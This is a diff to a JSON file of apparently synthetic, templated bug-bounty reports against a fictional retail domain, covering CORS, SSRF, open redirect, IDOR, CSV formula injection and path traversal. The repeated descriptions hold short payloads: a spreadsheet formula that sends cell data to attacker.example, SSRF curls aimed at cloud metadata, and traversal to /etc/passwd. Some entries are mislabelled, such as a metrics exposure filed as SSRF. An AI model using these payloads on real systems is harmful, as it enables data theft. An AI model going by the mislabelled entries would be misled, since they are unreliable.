+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.zedernfeld-retail.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17289,7 +17418,8 @@
           "offset": "7d 8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.zedernfeld-retail.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17425,7 +17555,8 @@
           "offset": "4d 18h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.zedernfeld-retail.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17543,7 +17674,8 @@
           "offset": "8d 23h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.zedernfeld-retail.foo/import`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17662,7 +17794,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.zedernfeld-retail.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17782,7 +17915,8 @@
           "offset": "3d 1h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.zedernfeld-retail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17921,7 +18055,8 @@
           "offset": "4d 16h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.zedernfeld-retail.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18097,7 +18232,8 @@
           "offset": "8d",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.zedernfeld-retail.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18219,7 +18355,8 @@
           "offset": "5d 13h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.zedernfeld-retail.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18399,7 +18536,8 @@
           "offset": "7d 19h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.zedernfeld-retail.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -18524,7 +18662,8 @@
           "offset": "5d 15h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://payments.zedernfeld-retail.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18663,7 +18802,8 @@
           "offset": "5d 11h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://payments.zedernfeld-retail.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18835,7 +18975,8 @@
           "offset": "6d 4h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.zedernfeld-retail.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18946,7 +19087,8 @@
           "offset": "2d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.zedernfeld-retail.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19064,7 +19206,8 @@
           "offset": "5d 14h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://shop.zedernfeld-retail.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19171,7 +19314,8 @@
           "offset": "5d 8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://shop.zedernfeld-retail.foo/export`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19297,7 +19441,8 @@
           "offset": "7d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.zedernfeld-retail.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19424,7 +19569,8 @@
           "offset": "3d 19h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://payments.zedernfeld-retail.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19571,7 +19717,8 @@
           "offset": "6d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://shop.zedernfeld-retail.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19731,7 +19878,8 @@
           "offset": "4d 19h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://payments.zedernfeld-retail.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -19907,7 +20055,8 @@
           "offset": "6d 13h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://payments.zedernfeld-retail.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20036,7 +20185,8 @@
           "offset": "9d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.zedernfeld-retail.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20155,7 +20305,8 @@
           "offset": "4d 23h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.zedernfeld-retail.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20294,7 +20445,8 @@
           "offset": "23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://payments.zedernfeld-retail.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20409,7 +20561,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://payments.zedernfeld-retail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20569,7 +20722,8 @@
           "offset": "5d 5h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.zedernfeld-retail.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20669,7 +20823,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://payments.zedernfeld-retail.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20849,7 +21004,8 @@
           "offset": "7d 14h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://shop.zedernfeld-retail.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20954,7 +21110,8 @@
           "offset": "8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://shop.zedernfeld-retail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21114,7 +21271,8 @@
           "offset": "5d",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://payments.zedernfeld-retail.foo/export`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21239,7 +21397,8 @@
           "offset": "6d 1h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.zedernfeld-retail.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21370,7 +21529,8 @@
           "offset": "2d 7h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
